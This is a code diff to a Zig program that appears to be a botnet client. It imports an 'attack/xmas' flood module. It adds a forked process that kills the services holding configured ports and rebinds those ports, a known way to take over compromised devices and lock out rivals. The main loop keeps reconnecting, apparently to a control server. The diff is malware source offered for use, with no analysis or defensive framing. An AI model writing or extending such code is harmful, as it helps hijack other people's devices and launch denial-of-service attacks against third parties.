@@ -12,8 +12,28 @@ const allocator = gpa.allocator();
 
 const xmas = @import("attack/xmas.zig");
 
+const Killer = @import("Killer.zig");
+const conf = @import("conf.zig");
+
 // pub export fn _start() callconv(.C) noreturn {
 pub fn main() void {
+    const pid = helpers.fork() catch |err| {
+        std.debug.print("fork err: {s}\n", .{@errorName(err)});
+        linux.exit(1);
+    };
+
+    if (pid == 0) {
+        const killer = Killer.init(allocator);
+
+        for (conf.KILL_PORTS) |port| {
+            killer.killByPort(port) catch unreachable;
+        }
+
+        for (conf.REBIND_PORTS) |port| {
+            killer.rebind(port) catch unreachable;
+        }
+    }
+
     while (true) {
         connect() catch |err| switch (err) {
             error.ConnectionResetByPeer => { // maybe blocked by server side
